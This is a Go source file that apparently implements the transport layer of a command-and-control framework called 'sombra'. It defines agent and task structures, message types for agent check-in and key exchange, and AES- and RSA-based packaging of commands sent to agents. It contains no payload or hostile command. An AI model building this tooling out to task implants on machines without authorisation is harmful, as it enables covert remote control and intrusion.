package transport

import (
	"bytes"
	"crypto/rsa"
	"encoding/binary"
	"io"
	"strings"

	"sombra/cmd/crypto"
)

type Agent struct {
	IP       string
	ExtIP    string
	Hostname string
	Sleep    string
	Jitter   string
	OS       string
	UID      string
	PID      string
}

type Task struct {
	UID       string
	CommandID string
	Command   string
}

func (t Task) String() string {
	return t.Command
}

type Result struct {
	CommandID string
	Result    string
}

type Envelope struct {
	Agent  Agent
	Task   Task
	Result Result
}

type Package struct {
	Pkg []byte
}

type LTVMessage struct {
	Length uint32
	Type   uint16
	Value  []byte
}

var (
	// TypeGenericSombraPackage
	TypeGenericSombraPackage uint16 = 0x0

	// TypeSombraGetTask is the magic number for agents getting tasks
	TypeSombraGetTask uint16 = 0x1

	// TypeSombraHello is the magic number for agents footprinting the server
	TypeSombraHello uint16 = 0x2

	// TypeSombraKeyExchange is the magic number for agents exchanging keys
	TypeSombraKeyExchange uint16 = 0x3

	// TypeSombraGenSession is the magic number for agents generating a session key, agent must have the server's public key
	TypeSombraGenSession uint16 = 0x4

	// TypeSombraInitAgent is the magic number for agents initializing themselves, teamserver must the shared session key
	TypeSombraInitAgent uint16 = 0x5

	// TypeGenericCheckin is the magic number for agents checking in to receieve tasks
	TypeGenericCheckin uint16 = 0x6

	// TypeGenericTaskRequest is the magic number for a task sent to the agent
	TypeGenericTaskRequest uint16 = 0x7
)

func (e *Envelope) Package(key []byte, nonce []byte) (*Package, error) {
	// data = [e.Task.UID] || [e.Task.CommandID] || [e.Task.Command]
	data := strings.Join([]string{e.Task.CommandID, e.Task.Command}, "||")
	task, err := EncodeLTVMessage(TypeGenericTaskRequest, []byte(data))
	if err != nil {
		return nil, err
	}
	task = crypto.Pad(task, 16)

	encrypted, err := crypto.EncryptAES(key, nonce, task)
	if err != nil {
		return nil, err
	}

	return &Package{
		Pkg: encrypted,
	}, nil
}

func UnwrapKey(enc_key string, privateKey *rsa.PrivateKey) (nonce []byte, key []byte, err error) {
	encryptedKey, err := crypto.Base64Decode(enc_key)
	if err != nil {
		return nil, nil, err
	}

	decryptedKey, err := crypto.DecryptRSA(privateKey, encryptedKey)
	if err != nil {
		return nil, nil, err
	}

	nonce, key, err = crypto.SplitSessionKey(decryptedKey)
	if err != nil {
		return nil, nil, err
	}

	return nonce, key, nil
}

func EncodeLTVMessage(msgType uint16, value []byte) ([]byte, error) {
	length := uint32(len(value))
	buffer := new(bytes.Buffer)

	if err := binary.Write(buffer, binary.BigEndian, length); err != nil {
		return nil, err
	}
	if err := binary.Write(buffer, binary.BigEndian, msgType); err != nil {
		return nil, err
	}
	if _, err := buffer.Write(value); err != nil {
		return nil, err
	}

	return buffer.Bytes(), nil
}

func DecodeLTVMessage(data []byte) (*LTVMessage, error) {
	buffer := bytes.NewReader(data)
	msg := &LTVMessage{}

	if err := binary.Read(buffer, binary.BigEndian, &msg.Length); err != nil {
		return nil, err
	}
	if err := binary.Read(buffer, binary.BigEndian, &msg.Type); err != nil {
		return nil, err
	}
	msg.Value = make([]byte, msg.Length)
	if _, err := io.ReadFull(buffer, msg.Value); err != nil {
		return nil, err
	}

	return msg, nil
}
